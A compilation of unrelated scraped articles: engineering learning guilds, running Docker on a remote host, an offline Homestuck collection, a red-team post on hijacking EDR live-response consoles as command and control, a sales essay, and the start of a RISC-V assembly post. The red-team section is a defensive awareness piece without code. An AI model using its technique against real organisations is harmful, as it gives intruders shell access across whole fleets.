<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>At Teachers Pay Teachers, we’ve been experimenting with a novel social learning format for the past two years. In this article, I discuss the motivations, design, and results of our experiment: reserving 10% of engineering time for personal growth.</p><div>
<div>
<div> <h2>Why does learning matter?</h2>
<p>We learn to keep up with an evolving world that’s changing quicker than ever. Consider the mobile landscape: iOS and Android didn’t exist 15 years ago, and a rich mobile experience felt exotic. Just ten years ago, releasing software monthly was considered moving fast; continuous delivery was considered a bleeding-edge approach reserved for only the boldest engineering teams. Around seven years ago, Oculus was virtually unknown and mainstream VR was a pipedream. That’s not to mention the rise of social media, emerging markets on the Internet, and the evolution of digital privacy and security.</p>
<p>There’s an acronym that succinctly describes the world we’re living in: VUCA</p>
<ul><li>Volatility – the world is constantly evolving;</li>
<li>Unpredictability – it’s challenging to predict with any degree of certainty what the next several months will look like;</li>
<li>Complexity – the world has many interconnected parts and variables, which make it difficult to understand and analyze;</li>
<li>Ambiguity – it’s tough to grasp the bigger picture and put much of what we’re observing in context.</li>
</ul><p>VUCA affects employees uniquely. If you consider agriculture, excelling is primarily a matter of owning land that you can use to produce goods. For manufacturing, you focus on acquiring capital that you can use to produce goods. Knowledge work on the other hand is about acquiring information that you can use to produce goods and services.&nbsp;</p>
<p>As technology advances, the value of agriculture and manufacturing skills tend to decay more slowly. For employees, every time there’s a new tool, platform, or even social norm we must revisit our assumptions and potentially rethink everything. For example, in 2011, 28.5% of websites relied on Adobe’s Flash Player and less than ten years later, that figure has fallen to less than 3%. Most Flash developers had to acquire an entirely new skillset in that time to stay relevant. As another example, in 2019 alone, demand for engineers familiar with blockchain rose 517% according to Hired.com’s <a href="https://hired.com/state-of-software-engineers">2020 State of Software Engineers</a> report. If you have a few years of blockchain experience, that puts you in the 99th percentile.</p>
<p>As companies evolve continuously to keep up with the pace of innovation, employees must learn continuously as their teams adopt new strategies, technologies, and best practices. In a VUCA world, teams that learn well, perform well.</p>
<h2>What makes learning at work challenging?</h2>
<p>Beyond learning to keep up with a changing world, it’s been demonstrated that learning is a great use of time.&nbsp;</p>
<p>The 2019 Edition of <a href="https://learning.linkedin.com/resources/workplace-learning-report-2019">LinkedIn’s Workplace Learning Report</a> compared heavy learners (people who spend 5+ hours per week learning) to light learners (people who spend fewer than one hour per week). LinkedIn Learning reports that heavy learners are 47% less likely to be stressed at work, 48% more likely to have found a sense of purpose in their work, and 74% more likely to know where they want to go in their career. Despite the benefits of learning, people typically struggle to make time for learning at work. In the same report, LinkedIn Learning found that 74% of people want to learn using spare time at work and 94% of respondents would stay at a company longer if it invested in their career. Despite this, the number one reason employees feel held back from developing is due to a lack of time to focus on growth.</p>
<p>Meanwhile, two-thirds of companies struggle to engage their employees in learning programs despite consistent increases in L&amp;D spend globally as companies attempt to close skill gaps. As a result, a whopping 75% of employees invest in their own work-related learning. Furthermore, employees spend up to 5x more time on self-directed learning than employer-sponsored learning.</p>
<p>It’s been demonstrated that learning is a good use of time and companies are investing hundreds of billions in professional development every year. But the vast majority of professional learning continues to be self-directed. What’s the disconnect?</p>
<h2>Learning communities</h2>
<p>A learning community is a group of people who share similar learning goals. Companies tend to emphasize solo learning experiences, which may be a contributing factor to the above trends; 87% of employees say sharing knowledge is a critical part of the learning experience yet only 34% of companies are investing in social learning. It seems like there’s a big missed opportunity here. Could adding a social element to learning help increase employee engagement with L&amp;D programs?</p>
<p>We can look to the DevOps Research and Assessment (DORA) team for a clue about the value of social learning. They’ve conducted the single largest study of DevOps best practices in history, with more than 31,000 survey responses collected over the last several years. One of their goals is to identify the practices that separate elite performers from the rest of the pack. Their conclusions are based on data rather than conjecture, and anecdotal evidence. Their research is so good, they were acquired by Google in 2018.</p>
<p>DORA’s <a href="https://services.google.com/fh/files/misc/state-of-devops-2019.pdf">2019 State of DevOps Report</a> concludes that:</p>
<p>‘High performers favor strategies that create community structures at both low and high levels in the organization, likely making them more sustainable and resilient to reorgs and product changes. The top two strategies employed are Communities of Practice and Grassroots.’</p>
<p>They define Communities of Practice (CoP) as:</p>
<p>‘Groups that share common interests in tooling, language, or methodologies are fostered within an organization to share knowledge and expertise with each other, across teams, and around the organization.’</p>
<p>The term ‘Communities of Practice’ was coined by Jean Lave, a cognitive anthropologist, and Étienne Wenger, a computer science Ph.D., and educational theorist. They were studying the apprenticeship models across various cultures, spaces, and times including Liberian tailors perfecting their craft; Yucatec Mayam Midwives learning prenatal care; and U.S. Navy Quartermasters learning how to navigate. They noted many groups relying on informal community structures for training and decided to call these self-organizing, knowledge-sharing groups ‘Communities of Practice’.</p>
<p>The following four factors distinguish a Community of Practice from other types of groups:</p>
<ul><li><strong>Purpose.</strong> The primary purpose is personal growth and building expertise.</li>
<li><strong>Membership</strong>. Members self-select based on interest or personal goals.</li>
<li><strong>Cohesive</strong> <strong>force</strong>. Shared passion and commitment of the group’s members.</li>
<li><strong>Duration</strong>. CoPs last as long as there’s interest.</li>
</ul><p>Consider the differences between CoPs and professional networks, which may appear similar at first glance. Professional networks exist primarily for the exchange of business information; include friends and business acquaintances; are held together by mutual needs; and exist as long as people have a reason to connect.</p>
<p>You likely already have Communities of Practice at your company. Why is it so important to study, understand, and nurture these communities? To maximize the impact of your CoPs, you need to find ways to connect them effectively to broader business activities.</p>
<p>'Although communities of practice are fundamentally informal and self-organizing, they benefit from cultivation. Like gardens, they respond to attention that respects their nature. You can’t tug on a cornstalk to make it grow faster or taller, and you shouldn’t yank a marigold out of the ground to see if it has roots. You can, however, till the soil, pull out weeds, add water during dry spells, and ensure that your plants have the proper nutrients.'</p>
<p>- Étienne Wenger, <a href="https://hbr.org/2000/01/communities-of-practice-the-organizational-frontier">Communities of Practice: The Organizational Frontier</a></p>
<h2>CoPs in practice</h2>
<p>At Teachers Pay Teachers, we recognized many of the pain points of employer-sponsored professional development within the engineering team. We had varied and nuanced learning needs with many going unmet; we offered a learning stipend that was frequently unused; engineers on the team started groups resembling CoPs, but they typically had low engagement; and internal experts were struggling to scale their knowledge.&nbsp;</p>
<p>Two years ago we began experimenting with reserving 10% of engineering time for personal growth and introduced two types of CoPs for structured social learning.</p>
<p>The first kind of CoP we introduced was the Learning Guild, consisting of a group of engineers with shared interests. They’re focused on <em>learning priorities</em> set by the engineering management team. To set learning priorities, we, as engineering management, reflect on the <em>gaps and weaknesses</em> we want to turn into <em>strengths and core competencies</em>. That includes hiring needs, shifts in our technical strategy, product performance, and various feedback channels such as engagement surveys.&nbsp;</p>
<p>The guilds pursue their learning goals using 2-3 week sprints. Each sprint consists of reading assignments and practice exercises to help members learn more deeply. At the conclusion of each sprint, the guild has a meeting consisting of a presentation by a member of the group followed by an open discussion.&nbsp;</p>
<p>This format has worked incredibly well for us with our most successful guilds seeing 100% retention; high scores for self-perceived learning; and a 97% speaker preparedness rating, which is a metric we use to ensure presenters are leading high-quality guild discussions. Ultimately, we’ve built a healthy iterative loop around learning that’s directly connected to the broader needs of our company.</p>

<p>The second kind of CoP is the Project Guild, which is how we structure self-directed learning. Project guilds consist of small group projects chosen by the group themselves. The primary requirement is that projects are connected to Teachers Pay Teachers in some way. Teams use Friday afternoons to make progress and frequently demo their work …</p></div></div></div></div>

            <p>Monday, 26 October 2020.</p>

            <p><img src="https://s3-eu-west-1.amazonaws.com/eu-west-1.beatletech.com/images/docker_logo.png" alt="Docker" width="30%" title="Docker"></p>

<h3 id="tldr"><strong>TL;DR</strong></h3>

<ul>
  <li>Running Docker on macOS results in noisy CPU fans and low performance (build times)</li>
  <li>Apple Silicon probably not the answer</li>
  <li>The solution is using remote Linux Docker host (with <a href="#1-install-docker-engine-on-remote-host">setup</a> instructions)</li>
</ul>

<h3 id="noisy-cpu-fans">Noisy CPU fans</h3>

<p>As a developer I’m a big fan of Apple hardware and software ever since I got my first Macbook back in 2008. MacOS is a UNIX operating system running on X86 hardware (changing to ARM soon, but more on that later) that makes developing for Linux production servers a smooth experience utilizing the same UNIX tooling. While my development stack changed over the years and nowadays includes Docker, Kubernetes and <a href="https://bedrock.io/">bedrock.io</a>, macOS still continues to serve me well. It is providing these new CLI tools and templates on a stable OS with little to no issues, a nice UI with great HIDPI scaling (rocking a LG 5K monitor over <a href="https://beatletech.com/setup">here</a>), and of course I’ve become so used to the interface that switching back to Windows or Linux Desktop would mess up my optimized workflows and habits.</p>

<p>One thing, however, that could use improvements is Docker Desktop (<a href="https://docs.docker.com/docker-for-mac/">for mac</a>), to increase Docker container performance, speed up docker build times and reduce CPU usage when running “idle”. The reason for being slow and performance hungry is succinctly explained in <a href="https://stackoverflow.com/questions/55951014/docker-in-macos-is-very-slow">this</a> Stackoverflow answer:</p>

<blockquote>
  <p>Docker needs a plain Linux kernel to run. Unfortunately, Mac OS and Windows cannot provide this. Therefore, there is a client on Mac OS to run Docker. In addition to this, there is an abstraction layer between Mac OS kernel and applications (Docker containers) and the filesystems are not the same.</p>
</blockquote>

<p>In other words, there is a lot of extra (hyper)virtualization and filesystem overhead going on. Of course a relative performance hit (compared to running on Linux directly) is something I could live with, but my main annoyance presents itself loudly when I’m building (and deploying) a lot of Docker images: it spins up my Macbook pro CPU fans to audible levels, something in stark contrast to the absolute silence at which my laptop runs almost everything else (I guess I’m spoiled).</p>

<p>While you could argue that you should not build and push Docker images to staging or production from your local development machine and just incorporate it in your CI/CD pipeline, I prefer having this manual control, which is also nicely supported by the <a href="https://bedrock.io/">bedrock.io</a> build and deploy commands. This point probably warrants a whole dedicated blog post, but if you are like me, and also run a lot of docker build commands locally, then you will be interested in the solution I found to my <strong>main problem: the lack of macOS docker performance (long build times) and noisy CPU fans</strong>.</p>

<h3 id="apple-silicon-is-not-the-solution">Apple Silicon is not the solution</h3>

<p>With myself being an Apple enthusiast, you can image why I’m excited about the upcoming transition from Intel CPUs to Apple Silicon, which is planned to make its debut in their Macbook Pro and iMac lineup later this year (<a href="https://9to5mac.com/2020/10/09/apple-silicon-november-bloomberg/">Rumors</a> point to a November event). So at first I thought that the answer to the lackluster Docker performance on the Mac would simply be waiting for the new ARM hardware release and buying a new Macbook Pro. However, this might not hold true as Apple Silicon will be an ARM SoC, which is a different architecture than X86_64. And X86_64 is still my deployment target for the foreseeable future. In other words, I still need to build X86_64 images and this will require emulation and virtualization that <a href="http://www.ml-illustrated.com/2020/06/25/ARM-Macs-virtualization-different-take.html">some</a> are expecting to have a 2x to 5x performance hit.</p>

<p>It is also worth noting that Craig Federighi, Apple’s senior vice president of Software Engineering, said the following during an interview after the initial WWDC Apple Silicon announcement:</p>

<blockquote>
  <p>“Virtualization on the new Macs won’t support X86 at all” (<a href="https://www.jeffgeerling.com/blog/2020/what-does-apple-silicon-mean-raspberry-pi-and-arm64">source</a>)</p>
</blockquote>

<p>Craig even explicitly called out Docker containers being built for ARM, and being able to run them on ARM instances in AWS, but what about building your X86 images? I know you can build for multi-arch including ARM now with docker desktop (<a href="https://www.docker.com/blog/multi-arch-images/">post</a>), but what will the performance hit be for Apple Silicon?</p>

<p>All in all, upcoming Apple Silicon doesn’t seem like an immediate win for my specific problem with Docker performance. Also, I like to skip 1st gen hardware and wait on the sidelines a bit longer before I migrate my production workflows to new hardware running on ARM.</p>

<p>Luckily I did find a solution that serves me right away and might also help with the transition to Apple Silicon in the future. <strong>Docker remote to the rescue!</strong></p>

<h3 id="remote-docker-host-solution">Remote Docker host Solution</h3>

<p>Instead of beefing up my local development machine now or with upcoming Apple ARM hardware, I looked into off-loading all the Docker activities onto a remote machine, and as it turns out, it is trivially easy to setup access to a remote docker host. I kinda knew about this, back when I was using Docker Swarm and connecting to different machines, but I somehow never thought about this as a setup for my “local” docker environment.</p>

<p>Needless to say, but one does not setup remote access without a remote machine, so I’m assuming you have a remote Linux machine running somewhere. I personally use and recommend dedicated or cloud servers from <a href="https://www.hetzner.com/">Hetzner</a>, that is if you are located in Europe. I’m using the <a href="https://www.hetzner.com/dedicated-rootserver/ax51-nvme">AX51-NVMe</a> Dedicated Root Server (Ryzen 7 3700X CPU, 64GB RAM, 1TB NVMe SSD), which seems comically cheap at only 59 Euros a month. Anyway, let’s get rolling.</p>

<h4 id="1-install-docker-engine-on-remote-host">1. Install Docker Engine on remote host</h4>
<p>First, let’s install Docker on your remote Linux server (I’m using the <a href="https://docs.docker.com/engine/install/ubuntu/">Ubunty install instructions</a>, but you can find instructions for other distros on that page as well):</p>

<figure><pre><code data-lang="bash"> <span>## Update the apt package index and install packages to allow apt to use a repository over HTTPS:</span>
 <span>$ </span><span>sudo </span>apt-get update

 <span>$ </span><span>sudo </span>apt-get <span>install</span> <span>\</span>
     apt-transport-https <span>\</span>
     ca-certificates <span>\</span>
     curl <span>\</span>
     gnupg-agent <span>\</span>
     software-properties-common

 <span>## Add Docker’s official GPG key:</span>
 <span>$ </span>curl <span>-fsSL</span> https://download.docker.com/linux/ubuntu/gpg | <span>sudo </span>apt-key add -

 <span>## Use the following command to set up the stable repository</span>
 <span>$ </span><span>sudo </span>add-apt-repository <span>\</span>
    <span>"deb [arch=amd64] https://download.docker.com/linux/ubuntu </span><span>\</span><span>
    </span><span>$(</span>lsb_release <span>-cs</span><span>)</span><span> </span><span>\</span><span>
    stable"</span>

 <span>## Install docker engine</span>
 <span>$ </span><span>sudo </span>apt-get update
 <span>$ </span><span>sudo </span>apt-get <span>install </span>docker-ce docker-ce-cli containerd.io</code></pre></figure>

<h4 id="2-create-docker-context">2. Create Docker Context</h4>

<p>Next up we need to access the remote Docker host and make it our default “local” engine. For this we leverage <strong>Docker Contexts</strong> in the following way. First we create a context that will hold the connection path (e.g. <code>ssh://coen@whatever.com</code>) to the remote docker host:</p>

<figure><pre><code data-lang="bash"> <span>$ </span>docker context create remote <span>--docker</span> <span>host</span><span>=</span>ssh://coen@whatever.com
 remote
 Successfully created context “remote”

 <span>$ </span>docker context <span>ls
 </span>NAME       TYPE    DESCRIPTION              DOCKER ENDPOINT    KUBERNETES ENDPOINT    ORCHESTRATOR
 default <span>*</span>  moby    Current DOCKER_HOST...   unix:///var/run/docker.sock               swarm
 remote     moby                             ssh://coen@whatever.com</code></pre></figure>

<p>And the final step is to make <code>remote</code> your default context:</p>

<figure><pre><code data-lang="bash"> <span>$ </span>docker context use remote
 remote
 Current context is now “remote”</code></pre></figure>

<h4 id="3-using-your-remote-docker-host">3. Using your remote Docker host</h4>

<p>With the previous 2 steps you are ready to start enjoying a <strong>silent</strong> local development machine when you are building docker images with an increased speed in build time! Any time you now run <code>docker build</code>, all the relevant (and changed) files that are required for the build are copied from your local computer to the remote Docker host in the background, and the <code>docker build</code> starts the build of the image on the remote host. The resulting image is also located on the remote host, which you can list with <code>docker images</code>, as all docker commands use the default <code>remote</code> context.</p>

<h3 id="benefits">Benefits</h3>

<p>To show you an example of Docker build speed improvements, let’s have a look at the following time measurements for building the <code>web</code> service component, a React SPA build with Webpack, of <a href="https://github.com/bedrockio/bedrock-core/tree/master/services/web">bedrock</a> on a clean build:</p>

<figure><pre><code data-lang="bash">  +---------+-------------------+--------------------+------------+---------------+
  | Context | Yarn <span>install time</span> | Webpack build <span>time</span> | Total <span>time</span> | Relative <span>time</span> |
  +---------+-------------------+--------------------+------------+---------------+
  | Local   | 75.82s            | 82.05s             | 157.87s    | 296% <span>(</span>~3x<span>)</span>    |
  +---------+-------------------+--------------------+------------+---------------+
  | Remote  | 18.19s            | 35.11s             |  53.30s    | 100% <span>(</span>1x<span>)</span>     |
  +---------+-------------------+--------------------+------------+---------------+</code></pre></figure>

<p>Of course a 3x improvement doesn’t come as a surprise when you are basically comparing a Macbook Pro with 2 (virtual) CPUs allocated to Docker, versus an 8 core dedicated Linux machine (with hyperthreading and higher internet bandwidth) even though not everything runs multi-threaded. But it is a big improvement that you can quickly and easily get for yourself and reap the benefits, which quickly adds up over time. Not to mention the complete silence at which you gain the faster build times.</p>

<p>As a bonus, you can now stop running Docker Desktop entirely, and no longer see a Docker process “idling” in the background that would otherwise still be using around 20% CPU all the time (doing nothing).</p>

<p>Being able to build X86_64 images on a remote machine, incidentally also makes it more viable to migrate my development environment to Apple Silicon in the future, not depending on Apple ARM to build and run my X86_64 images.</p>

<p>Finally, of course you can also <code>docker run</code> containers on your remote host. For example running MongoDB:</p>

<figure><pre><code data-lang="bash"> <span>$ </span>docker run <span>--name</span> mongo <span>-d</span> <span>-p</span> 27017:27017 <span>-v</span> /root/data:/data/db mongo:4.2.8
 <span># Note: /root/data is located on your remote machine</span></code></pre></figure>

<p>In order to access and use the running MongoDB container locally, make sure to SSH tunnel to your remote machine and forward the relevant ports. For this you can update your SSH config file: <code>.ssh/config</code>:</p>

<figure><pre><code data-lang="bash"><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre>Host coentunnel
  HostName …</pre></td></tr></tbody></table></code></pre></figure></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="introCard">
    <p><img src="https://bambosh.github.io/unofficial-homestuck-collection/images/collection_logo.png">
    </p>
    <div>
      <p><a href="https://twitter.com/Bamboshu" target="_blank"><i></i> Visit me on Twitter!</a></p>
      <p><a href="#download"><i></i> Skip to the download</a></p>
      
      <p>Let me tell you a story about a webcomic called <em>Homestuck</em>. The fourth in a series of “MS Paint Adventures” authored by Andrew Hussie from 2006 to 2016, it became wildly successful, in part because of its eclectic use of web technology like Adobe Flash and GIF animations.</p>

      <p>However, with Flash finally being phased out at the end of 2020, <em>Homestuck</em> is in a precarious state. While there have been official attempts to preserve aspects of the original experience by <a href="https://www.homestuck.com/" target="_blank">VIZ Media</a> (who have published <em>Homestuck</em> since 2018), the results have been mixed. With extra content scattered around the web in various states of decay, a solution was needed to preserve <em>Homestuck's</em> one-of-a-kind presentation and flair, for both returning readers and those new to the story.</p>
    </div>
  </div><div>
    <div>   

      <h2>YOUR WORST ADDICTION, NOW SAFE ON YOUR DESKTOP</h2>
      <p><em>The Unofficial Homestuck Collection</em> is a heavily customised browser, built from the ground up to support <em>Homestuck</em> and its related works. Flashes? We got 'em. The collection runs Flash content natively, providing the most authentic Homestuck experience possible.</p>
      <p>Don't get it twisted though, because "browser" in this context doesn't mean "online". <em>The Unofficial Homestuck Collection</em> is completely self contained, and <em>never</em> has to connect to the internet once you have it downloaded. </p>

      <h2>A ONE-STOP SHOP</h2>
      <p>Don't think we'd be content stopping at just <em>Homestuck</em>. The collection contains the other MS Paint Adventures, official <em>Homestuck</em> side-stories, and a garguantuan array of goodies for the enquiring reader. <a href="#faq2">Seriously, there is SO MUCH CONTENT in this thing.</a> It's totally ridiculous.</p> 

      <h2>NEW READER? NO PROBLEM.</h2>
      <p>Always wanted to try Homestuck? Overwhelmed by all the side-stories and sequels, and frustrated by the late-arrival spoilers plastered all over the internet? We've got your back. From the very beginning, <em>The Unofficial Homestuck Collection</em> has been designed to work as a safe way for new readers to get their teeth into the <em>Homestuck</em> universe. If you so choose, all future content will be carefully gated off until your progress in <em>Homestuck</em> makes it safe to view.</p>
    </div>
  </div><div>
    <div>
      <h2>THIS IS WHAT THE REFRANCE</h2>
      <p><em>The Unofficial Homestuck Collection</em> contains a complete database of the <em>Homestuck</em> Bandcamp, up to the most recent album as of <em>10/25/2020</em>. Want to know more about the crazy song you just heard in that Flash animation? Follow the link and see what's up! If you so choose, you can even enable an inline media player that legally streams the music directly from the source. You can try not to get lost exploring the twisted web of Homestuck's discography, but it's inevitable.</p>

      <h2>ENHANCED IN WAYS YOU CAN'T EVEN IMAGINE</h2>
      <p>We've got complete control over the browser, so you'd better believe we're taking advantage of it. Mid 2000's quality bitcrushed Flash audio? Nah, man. Almost every single flash in Homestuck has been painstakingly reworked with the highest quality music available. <a href="https://bambosh.github.io/unofficial-homestuck-collection/images/Untitled-60.jpg">You have to hear it to believe it.</a> Want to use themes on every page? Go nuts, I'm not the boss of you. Arrow key navigation? Automatically opening pesterlogs? You got it. Want absolutely none of the above? That's also an option! It's Homestuck, the way <em>you</em> want it.</p>
    </div>
  </div><div>
  <div>
   <h2>FAQ</h2>

      <h3>So you just... download it? That's it?</h3>
      <p>That's right! Well, almost. You probably saw above, but <em>The Unofficial Homestuck Collection</em> is actually split into two downloads: the desktop application itself, and the Asset Pack. In order to get it running, you need to pair the application with the asset pack the first time you start it up. The first thing you see will be <a href="https://bambosh.github.io/unofficial-homestuck-collection/images/setup.png">a screen like this, with a "Locate Assets" button down the bottom.</a> Once you have the Asset Pack downloaded, extract it anywhere you want. Even an external hard drive will work! Then hit the "Locate Assets" button, and select the extracted folder. The program will automatically restart, and bring you into the main browser!</p>

      <p>With all that said, <a href="https://github.com/Bambosh/unofficial-homestuck-collection" target="_blank">the application is completely open source, and you can play around the repository as much as you want over here.</a> It's all GPL-3.0, so fork it, request features, do whatever!</p>
      <br>

      <h3 id="faq2">Okay, so what's actually in it?</h3>
      <p>That's an extremely good question. The issue with this is that it's so damn large I can't even remember everything inside off the top of my head. Here's a by-no-means exhaustive list:</p>

          </ul>
          <p>
          And that's not even all of it? How big is this thing?
        </p></div>
      </div>
      <h3>Wait, doesn't this have the Epilogues? Or Homestuck^2? What gives?</h3>
      <p><a href="https://www.patreon.com/homestuck" target="_blank">You! Giving to the Homestuck team, that is.</a> The new age of Homestuck is going strong, and it needs your support to continue. I consider the Epilogues, HS^2, and the various games released over the past few years to be under active maintenance, and an ongoing source of income for the creators. Including those in the collection would feel scummy. The main reason it exists is to prevent the technological decay of Homestuck, not to "stick one to the man" or some garbage. Need to read the Epilogues offline? <a href="https://www.viz.com/read/graphic-novel/homestuck-epilogues/product/6154" target="_blank">They made a book for that! It's literally just text!</a> And speaking of books, go and check out <a href="https://www.viz.com/homestuck">Viz's line of deluxe Homestuck hardcovers.</a> They have tons of author commentary you won't find in the collection, because again, I'm <em>really</em> not about harming these guys financially.</p>
      <br>
      
      <h3>So, what's your endgame then?</h3>
      <p>Homestuck is suffering with the decline of Flash, and as long as it exists on the internet, these problems will be inherent to it. The ideal outcome for this collection is that it keeps Homestuck alive for people who may otherwise have given up on it, so they can continue to support all the official channels going forward. If this project results in even one new fan hopping on-board who otherwise wouldn't have, I would consider that a success.</p>

<![CDATA[Leveraging the Blue Team's Endpoint Agent as C2]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>A few years back the Blue Team of a company asked to be targeted in a Red Team Operation.</p>
<p>That was a really fun, because Rules of Engagement commonly prevent targeting Blue Teams. Blue’s infrastructure, systems and team members are often out of scope, unfortunately.</p>
<blockquote>
<p>Blue team infrastructure is a gold mine for credentials, recon but also for remote code execution!</p>
</blockquote>
<p>Often companies do not have adequate protection, procedures (MFA, multi-person attestation), monitoring and auditing in place when it comes to accessing data from endpoint agents. There is also frequently a lack of knowledge on what Endpoint Agents are capable of doing.</p>
<p><strong>So, what better way to compromise the blue team via their own tooling I thought? :)</strong></p>
<p><img src="https://embracethered.com/blog/images/2020/binary.jpg" alt="Attack"></p>
<p>This post is a reiteration of a section in Red Team Strategies about focusing on EDR and endpoint agents, as I still think this threat needs a lot more attention.</p>
<h2 id="endpoint-agents-as-c2">Endpoint Agents as C2</h2>
<p>Endpoint Protection and Response (EDR) agents and solutions like Carbon Black, Crowdstrike’s Falcon, Windows Defender ATP and so forth commonly provide built-in Command &amp; Control infrastructure.</p>
<p>The agents are typically managed via a web interface, so tactics such as <a href="https://attack.mitre.org/techniques/T1550/004/">“Pass the Cookie”</a> might be performed by adversaries after compromising blue team members.</p>
<p>Obviously this can be misused by an adversary.</p>
<p>Once an adversary has access to the Web UI, there are features such as “Go Live”, or “Live Response” that allow access to any host in the organization where the EDR agent is running.</p>
<p><strong>No kidding!</strong></p>
<p>Using this technique is quite elegant, as it does not require the red team to maintain or run their own infrastructure.</p>
<h2 id="products-and-examples">Products and Examples</h2>
<p>There is a wide range of products, but they mostly converge around a common feature set, including establishing interactive shells and command execution on hosts. Here are some examples and details from vendors:</p>
<ul>
<li>
<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/respond-machine-alerts#initiate-live-response-session">Windows Defender ATP - Initiate Live Response Session</a></p>
<blockquote>
<p>“Live response is a capability that gives you instantaneous access to a device by using a remote shell connection.”</p>
</blockquote>
</li>
<li>
<p><a href="https://www.crowdstrike.com/blog/tech-center/remote-remediation-real-time-response/">Crowdstrike - How to Remotely Remediate an Incident</a></p>
<blockquote>
<p>“With the ability to run commands, executables and scripts, the possibilities are endless.”
<a href="https://embracethered.com/blog/images/2020/RTR-gif.gif"><img src="https://embracethered.com/blog/images/2020/RTR-gif.gif" alt="FalconD"></a></p>
</blockquote>
</li>
<li>
<p><a href="https://www.carbonblack.com/blog/screenshot-demo-carbon-black-live-response-in-action/">Carbon Black - “Go Live”</a></p>
<blockquote>
<p>With Live Response, Carbon Black gives you a terminal right in our Web console and via the already-existing sensor on the endpoint. You just click “Go Live” and you’re in.</p>
</blockquote>
</li>
</ul>
<p>During red team operations I have used some of these to get quick root access on arbitrary hosts.</p>
<p><strong>Fun times!</strong></p>
<h2 id="are-these-features-really-needed">Are these features really needed?</h2>
<p>To be fair, for some investigations a blue team member might indeed find a manual shell useful to grab certain log files or other evidence. Although, that should really be an exception - as tasks should be automated as much as possible.</p>
<p>But, it’s also worth noting that these are cloud systems. This means that your blue team is not the only one with access. The vendor might also directly or indirectly have access to this capabilitiy. The attack surface is quite large.</p>
<p>If these risks are acceptable to your business depends on your organization.</p>
<h2 id="so-why-should-the-red-team-test-for-this">So, why should the Red Team test for this?</h2>
<p>A couple of things can be highlighted with such an operation:</p>
<ol>
<li><strong>Detection and Monitoring</strong>: Does the Blue Team and SOC have proper detections and monitoring in place to catch compromise or misuse?</li>
<li><strong>Security Controls</strong>: Are proper security controls in place for the EDR web portal (MFA, multi-person attestation before “going live”), etc.</li>
<li><strong>Auditing</strong>: Are the commands that the blue team member (or attacker) is running logged?</li>
<li><strong>Raising awareness</strong>: Interesting questions might come up as well, for instance does the IT team know about this “backdoor” access to the fleet?</li>
<li><strong>Who watches the watchers?</strong> Requiring rigorous monitoring of these features and performing drills to validate they are not misused is part of the red teams goals</li>
</ol>
<p>Hope this provides some ideas on how to validate the infrastructure and procedures of the blue team is in good shape.</p>
<p>Cheers.

<p>When I started, I got told I couldn’t be in Sales. I couldn’t network; therefore, I’d be a lousy salesperson.&nbsp;</p>



<p>Have they told you before you couldn’t do a job because you lacked the talent? Like becoming a Salesperson? Or a programmer?</p>



<p>“You can’t become X because you don’t know how to network, and you’re not good at math.” That’s what they told me. And it’s complete nonsense.</p>



<p>People think you need to have “it,” a talent.&nbsp;</p>



<p>Before I got into Sales, I was a software developer. They tell similar stories to software developers. “No, you won’t be successful because you suck at Math.” I was never good at math, yet I became quite good at writing software.</p>



<p>Both professions share something. You don’t need to have the unique talent to become successful. Writing Code and selling something are both <strong>skills</strong> you build over time through training.</p>



<p>In Software development, you learn about statements, variables, functions and putting all of it together into a working program. Practice it often enough, and whatever problem you work on, you’ll be able to solve it.&nbsp;</p>



<p>Sales works the same way. You learn about process, handling objections, negotiating, asking the right questions, and eventually, you’ll close deals.&nbsp;</p>



<p>If you’re a software developer reading this, you will most likely think, “But it’s not enough to just learn foundations. There’s OOP, Functional Programming, …”. That’s right. Learning never stops in Software Development. Same for Sales.</p>



<p>There are so many different approaches to sell something to somebody; everything keeps evolving.&nbsp;</p>



<p>I had an eye-opening moment in early 2019. I was attending a sales seminar in Northern Germany. During two days, we learned a lot of useful things. Eventually, we came to the topic of handling objections.&nbsp;</p>



<p>The trainer asked, “Who here has trouble with handling objections? Raise your hand, and we’ll practice this on stage.”</p>



<p>A few people raised their hands, and he picked a young man, working as a photographer. Firstly, he asked the young man, “What are some common objections you hear every day?” and wrote them on a whiteboard. “Ok, then, let’s find a good answer for each of them.” and again wrote down all answers.</p>



<p>Next, they enacted in a role play. The trainer played the customer, mentioning one objection after another. The photographer replied with his canned response, trying to steer the conversation towards a close.&nbsp;</p>



<p>Of course, the photographer would have to put in some more effort to practice a satisfactory reply. Yet, he learned to handle objections within 15 minutes.</p>



<p>I was amazed. Could that be so easy? Later, the trainer did a similar role-play with another audience member to practice closing deals on stage. Within 15 minutes, the attendee could close customers. Amazing.&nbsp;</p>



<p>I took lots of notes and started practicing once I was back at the hotel. I learned new techniques, adopted a new mindset, yet the most crucial aspect was this:</p>



<p>If a small business owner can learn how to handle objections and close deals on stage within 15-20 minutes, I can learn this.&nbsp;</p>



<p>Whenever now prospects object with “It’s too expensive” or “I need to think about this,” I know what to do. I built the confidence to handle these situations.&nbsp;</p>



<p>Therefore, you don’t need talent. You need the right techniques and persistence to learn.&nbsp;</p>

      <h2>October 25, 2020</h2>

      
    </header>

    <p>This post explores RISC-V assembly by examining the implementation of the <code>setjmp</code> and <code>longjmp</code> functions from the C standard library. I frequently find that I grasp concepts more quickly when I have actual code that I can disassemble because it allows me to connect information with intent. I believe RISC-V and similar efforts will fundamentally shift how computers are made and programmed. I hope that sharing my knowledge will inspire the same joy in others that I feel when imagining a future of open hardware.</p>
<p><em>Note: We will be using the RISC-V GNU toolchain throughout this post. If you would like to follow along, you can cross-compile the toolchain for a RISC-V target, or you can download a <a href="https://github.com/sifive/freedom-tools/releases">prebuilt toolchain and emulator</a>. You can also compile and run the programs using a different target toolchain, but the assembly dump will be specific to that architecture. If you are more familiar with a different ISA, this may be a useful way to learn about RISC-V!</em></p>
<h2 id="a-look-at-local-jumps">A Look at Local Jumps</h2>
